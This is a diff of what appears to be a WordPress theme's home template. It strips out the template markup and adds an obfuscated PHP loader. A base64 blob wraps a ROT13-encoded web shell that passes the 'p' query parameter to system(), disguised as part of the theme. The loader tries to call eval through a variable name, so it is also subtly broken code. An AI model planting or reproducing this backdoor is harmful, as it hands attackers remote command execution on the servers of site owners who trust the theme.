@@ -1,29 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Business home template
- * Slug: twentytwentyfour/template-home-business
- * Template Types: front-page, home
- * Viewport width: 1400
- * Inserter: no
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IE9oZnZhcmZmIHVienIgZ3J6Y3luZ3IKICogRnlodDogZ2pyYWdsZ2pyYWdsc2JoZS9ncnpjeW5nci11YnpyLW9oZnZhcmZmCiAqIEdyemN5bmdyIEdsY3JmOiBzZWJhZy1jbnRyLCB1YnpyCiAqIEl2cmpjYmVnIGp2cWd1OiAxNDAwCiAqIFZhZnJlZ3JlOiBhYgogKi8KPz4KCjwhLS0gamM6Z3J6Y3luZ3ItY25lZyB7XCJmeWh0XCI6XCJ1cm5xcmVcIixcIm5lcm5cIjpcInVybnFyZVwiLFwiZ250QW56clwiOlwidXJucXJlXCJ9IC8tLT4KCjwhLS0gamM6dGViaGMge1wiZ250QW56clwiOlwiem52YVwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wib3licHhUbmNcIjpcIjBcIixcInpuZXR2YVwiOntcImdiY1wiOlwiMFwifX19LFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicXJzbmh5Z1wifX0gLS0+Cjx6bnZhIHB5bmZmPVwiamMtb3licHgtdGViaGNcIiBmZ2x5cj1cInpuZXR2YS1nYmM6MFwiPgoJPCEtLSBqYzpjbmdncmVhIHtcImZ5aHRcIjpcImdqcmFnbGdqcmFnbHNiaGUvY250ci11YnpyLW9oZnZhcmZmXCJ9IC8tLT4KPC96bnZhPgo8IS0tIC9qYzp0ZWJoYyAtLT4KCjwhLS0gamM6Z3J6Y3luZ3ItY25lZyB7XCJmeWh0XCI6XCJzYmJncmVcIixcIm5lcm5cIjpcInNiYmdyZVwiLFwiZ250QW56clwiOlwic2JiZ3JlXCJ9IC8tLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-
-<!-- wp:template-part {"slug":"header","area":"header","tagName":"header"} /-->
-
-<!-- wp:group {"tagName":"main","style":{"spacing":{"blockGap":"0","margin":{"top":"0"}}},"layout":{"type":"default"}} -->
-<main class="wp-block-group" style="margin-top:0">
-	<!-- wp:pattern {"slug":"twentytwentyfour/page-home-business"} /-->
-</main>
-<!-- /wp:group -->
-
-<!-- wp:template-part {"slug":"footer","area":"footer","tagName":"footer"} /-->
